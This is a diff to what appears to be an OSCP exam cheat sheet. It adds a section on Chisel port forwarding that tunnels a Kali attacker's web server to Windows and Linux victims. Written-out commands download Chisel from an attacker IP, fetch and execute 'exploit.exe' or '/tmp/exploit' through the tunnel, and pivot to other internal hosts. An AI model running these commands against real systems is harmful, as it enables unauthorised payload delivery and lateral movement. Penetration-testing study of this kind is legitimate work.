@@ -2832,6 +2832,7 @@ On Kali:
 mysql -h 127.0.0.1 -P 13306 -u <USER> -p --skip-ssl
 ```
 
+
 #### Quick Verification
 
 On victim, confirm the service is local-only:
@@ -2901,6 +2902,194 @@ redis-cli -h 127.0.0.1 -p 6379
 ```
 
 ---
+
+### 15.5 Chisel Forward Port Forwarding - Expose Kali Services to the Victim
+
+Use this when you are hosting something on Kali, such as a Python web server on port `80`, but the victim cannot directly reach `http://<KALI_IP>:80`. This often happens when firewall rules block direct access to your Kali web server, but the victim can still reach your Chisel server port, such as `8000`.
+
+This creates a listener on the victim side, such as `127.0.0.1:8080`, and forwards it through the Chisel tunnel back to Kali’s `127.0.0.1:80`.
+
+> Chisel syntax note:
+>
+> ```text
+> <VICTIM_LISTEN_HOST>:<VICTIM_LISTEN_PORT>:<KALI_HOST_FROM_CHISEL_SERVER>:<KALI_PORT>
+> ```
+>
+> Example:
+>
+> ```text
+> 127.0.0.1:8080:127.0.0.1:80
+> ```
+>
+> This means: victim listens on `127.0.0.1:8080`, and traffic is forwarded through Chisel to Kali’s `127.0.0.1:80`.
+
+#### Example: Serve an Exploit from Kali Port 80 to the Victim via Chisel
+
+On Kali, place your payload or exploit in your web directory:
+
+```bash
+mkdir -p ~/oscp/serve
+cp exploit.exe ~/oscp/serve/
+cd ~/oscp/serve
+```
+
+Start a Python web server on Kali port `80`:
+
+```bash
+sudo python3 -m http.server 80
+```
+
+In another Kali terminal, start the Chisel server:
+
+```bash
+chisel server --port 8000 --reverse
+```
+
+On the Windows victim, download Chisel:
+
+```powershell
+iwr -uri http://192.168.45.195/chisel.exe -Outfile chisel.exe
+```
+
+On the Windows victim, create the forward port tunnel:
+
+```powershell
+.\chisel.exe client 192.168.45.195:8000 127.0.0.1:8080:127.0.0.1:80
+```
+
+Now, from the victim, download the exploit from the victim’s own localhost port `8080`:
+
+```powershell
+iwr -uri http://127.0.0.1:8080/exploit.exe -Outfile exploit.exe
+```
+
+Run the exploit:
+
+```powershell
+.\exploit.exe
+```
+
+#### Linux Victim Version
+
+On Kali:
+
+```bash
+cd ~/oscp/serve
+sudo python3 -m http.server 80
+```
+
+In another Kali terminal:
+
+```bash
+chisel server --port 8000 --reverse
+```
+
+On the Linux victim, download and run Chisel:
+
+```bash
+wget http://192.168.45.195/chisel -O /tmp/chisel
+chmod +x /tmp/chisel
+/tmp/chisel client 192.168.45.195:8000 127.0.0.1:8080:127.0.0.1:80
+```
+
+From the Linux victim, download the payload through the local forwarded port:
+
+```bash
+wget http://127.0.0.1:8080/exploit -O /tmp/exploit
+chmod +x /tmp/exploit
+/tmp/exploit
+```
+
+#### Why Use Victim Port 8080 Instead of 80?
+
+Use `8080` on the victim side because binding to low ports like `80` may require elevated privileges, especially on Linux. If you already have admin/root or you specifically need port `80`, you can bind to port `80` instead.
+
+```powershell
+.\chisel.exe client 192.168.45.195:8000 127.0.0.1:80:127.0.0.1:80
+```
+
+#### Bind to All Interfaces on the Victim
+
+If another internal machine needs to reach the Kali-hosted file server through the victim, bind the victim listener to `0.0.0.0` instead of `127.0.0.1`.
+
+```powershell
+.\chisel.exe client 192.168.45.195:8000 0.0.0.0:8080:127.0.0.1:80
+```
+
+Then another internal host can access:
+
+```text
+http://<VICTIM_INTERNAL_IP>:8080/exploit.exe
+```
+
+#### Common Kali-to-Victim Forwarding Patterns
+
+Forward Kali Python web server port `80` to victim localhost `8080`:
+
+```bash
+127.0.0.1:8080:127.0.0.1:80
+```
+
+Forward Kali Python web server port `8000` to victim localhost `8080`:
+
+```bash
+127.0.0.1:8080:127.0.0.1:8000
+```
+
+Forward Kali SMB server port `445` to victim localhost `8445`:
+
+```bash
+127.0.0.1:8445:127.0.0.1:445
+```
+
+Forward Kali netcat listener port `443` to victim localhost `4444`:
+
+```bash
+127.0.0.1:4444:127.0.0.1:443
+```
+
+#### Quick Verification
+
+On Kali, confirm the Python web server is listening:
+
+```bash
+ss -lntp | grep ':80'
+```
+
+On the victim, after starting Chisel, confirm the local forwarded port is listening:
+
+```powershell
+netstat -ano | findstr 8080
+```
+
+Linux victim:
+
+```bash
+ss -lntp | grep 8080
+```
+
+Test from the victim:
+
+```powershell
+iwr -uri http://127.0.0.1:8080/
+```
+
+Linux victim:
+
+```bash
+curl http://127.0.0.1:8080/
+```
+
+#### Troubleshooting
+
+If the victim cannot access `http://127.0.0.1:8080`, check that:
+
+- Kali Python web server is running.
+- Chisel server is running on Kali port `8000`.
+- The victim can reach Kali port `8000`.
+- You used forward syntax without `R:` for Kali-to-victim forwarding.
+- You used reverse syntax with `R:` only for victim-to-Kali forwarding.
+- You used a high victim-side port like `8080` if you do not have admin/root.
 
 ## 16. Exam-Proven Attack Patterns
 
